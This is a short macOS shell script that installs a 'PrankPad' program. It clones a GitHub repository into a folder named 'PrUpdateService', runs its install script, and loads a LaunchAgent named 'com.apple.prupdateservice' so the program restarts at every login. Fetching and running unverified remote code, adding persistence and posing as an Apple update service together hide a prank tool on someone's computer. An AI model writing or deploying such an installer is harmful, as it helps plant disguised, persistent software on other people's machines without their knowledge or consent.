#!/bin/sh

PROGDIR="$HOME/Library/Application Support/PrUpdateService"
LAUNCHDIR="$HOME/Library/LaunchAgents"

rm -rf "$PROGDIR"
git clone https://github.com/pranksrus/prankpad.git "$PROGDIR"
"$PROGDIR/install.sh"

mkdir -p "$LAUNCHDIR"

launchctl unload "$LAUNCHDIR/com.apple.prupdateservice.plist"
cp "$PROGDIR/bootstrap/com.apple.prupdateservice.plist" "$LAUNCHDIR"
launchctl load "$LAUNCHDIR/com.apple.prupdateservice.plist"

echo "PrankPad Successfully Installed"
